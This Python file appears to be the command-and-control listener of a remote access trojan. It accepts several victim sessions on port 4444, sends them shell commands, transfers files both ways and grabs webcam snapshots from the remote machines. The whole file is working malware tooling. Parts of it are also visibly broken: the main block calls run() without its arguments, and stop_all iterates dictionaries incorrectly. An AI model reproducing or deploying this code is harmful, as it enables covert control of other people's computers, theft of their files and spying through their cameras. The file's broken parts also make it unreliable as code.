import socket
import os
import tqdm
import sys
import signal
from multiprocessing import Process, Pipe, Manager


class Listening:
    def __init__(self, host, port):
        self.SERVER_HOST = host
        self.SERVER_PORT = port
        self.BUFFER_SIZE = 10240
        self.sessions = Manager().dict()
        self.process = Manager().dict()
        # create socket
        self.s = socket.socket()
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.listen(5)
        print(f"[*] Listening as {self.SERVER_HOST}:{self.SERVER_PORT}")
        Process(target=self.accept).start()

    def accept(self):
        i = 0
        while 1:
            client_socket, client_address = self.s.accept()
            parent_conn, child_conn = Pipe()
            print(f"[+] connect from {client_address[0]}: {client_address[1]} in session: {i}")
            spath = client_socket.recv(self.BUFFER_SIZE).decode()
            p = Process(target=self.run, args=(child_conn, client_socket))
            self.sessions[i] = (parent_conn, child_conn, spath)
            p.start()
            self.process[i] = p.pid
            i += 1

    def run(self, child_conn, client_socket):
        while 1:
            cmd = child_conn.recv()
            self.send_cmd(cmd, client_socket)

    def stop(self, session):
        os.kill(self.process[session], signal.SIGKILL)
        self.sessions.pop(session)

    def stop_all(self):
        for k, v in self.sessions:
            self.sessions.pop(k)
        for k, v in self.process:
            os.kill(v, signal.SIGKILL)
            self.process.pop(k)

    def download(self, localpath, client_socket):
        rev = client_socket.recv(self.BUFFER_SIZE).decode()
        if rev == "Path doesn't exist!":
            return rev
        elif rev == "0":
            return "Broken file!"
        else:
            file_size = int(rev)
        client_socket.send("ok".encode())
        progress = tqdm.tqdm(range(file_size), f"Receiving {localpath}", unit="B", unit_scale=True, unit_divisor=1024)
        left = file_size
        with open(localpath, "wb") as f:
            while True:
                bytes_read = client_socket.recv(self.BUFFER_SIZE)
                f.write(bytes_read)
                left -= len(bytes_read)
                progress.update(len(bytes_read))
                if left == 0:
                    break
        return "success"

    def upload(self, localpath, client_socket):
        f = open(localpath, "rb")
        filesize = os.path.getsize(localpath)
        client_socket.send(str(filesize).encode())
        if client_socket.recv(self.BUFFER_SIZE).decode() == "ok":
            while 1:
                byte_read = f.read(self.BUFFER_SIZE)
                if not byte_read:
                    break
                client_socket.sendall(byte_read)
        else:
            raise FileNotFoundError

    def send_cmd(self, cmd, client_socket):
        if cmd[:8].lower() == "download":
            try:
                filename, localpath = cmd[9:].split(" ")
                client_socket.send("download ".encode() + filename.encode())
                status = self.download(localpath, client_socket)
                print(status)
            except ValueError:
                print("Invalid syntax")
            except BrokenPipeError:
                print("[-] Connection has been died..")
                raise BrokenPipeError
        elif cmd[:6].lower() == "upload":
            try:
                localpath, remotepath = cmd[7:].split(" ")
                client_socket.send("upload ".encode() + remotepath.encode())
                self.upload(localpath, client_socket)
            except FileNotFoundError:
                print("Upload failed! No such file")
            except ValueError:
                print("Invalid syntax!")
            except BrokenPipeError:
                print("[-] Connection has been died..")
                raise BrokenPipeError
        elif cmd[:11].lower() == "webcam_snap":
            localpath = cmd[12:].strip()
            client_socket.send(cmd.encode())
            status = self.download(localpath, client_socket)
            print(status)

        # send the command to the client
        client_socket.send(cmd.encode())
        # retrieve command results
        results = client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
        # print them
        print(results, end='> ')


if __name__ == '__main__':
    l = Listening("0.0.0.0", 4444)
    l.run()